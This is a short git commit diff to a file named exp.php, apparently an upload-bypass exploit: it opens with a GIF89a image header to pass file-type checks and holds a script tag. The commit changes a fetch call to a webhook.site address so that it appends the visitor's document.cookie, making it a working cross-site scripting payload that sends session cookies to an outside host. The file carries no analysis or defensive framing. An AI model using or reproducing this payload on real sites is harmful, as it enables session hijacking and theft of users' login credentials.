ef48782d0022f3d8300b5d6ca05f71be885981ef
ngocdm2 <ngocdm002@gmail.com>
2025-07-23 14:46:44 +0700

    Update exp.php

--- exp.php
+++ exp.php
@@ -1,4 +1,4 @@
 GIF89a;
 <script>
-fetch('https://webhook.site/cd86bf55-e335-4cb4-91c3-93c0e0093eee')
+fetch('https://webhook.site/cd86bf55-e335-4cb4-91c3-93c0e0093eee?c='+document.cookie)
 </script>
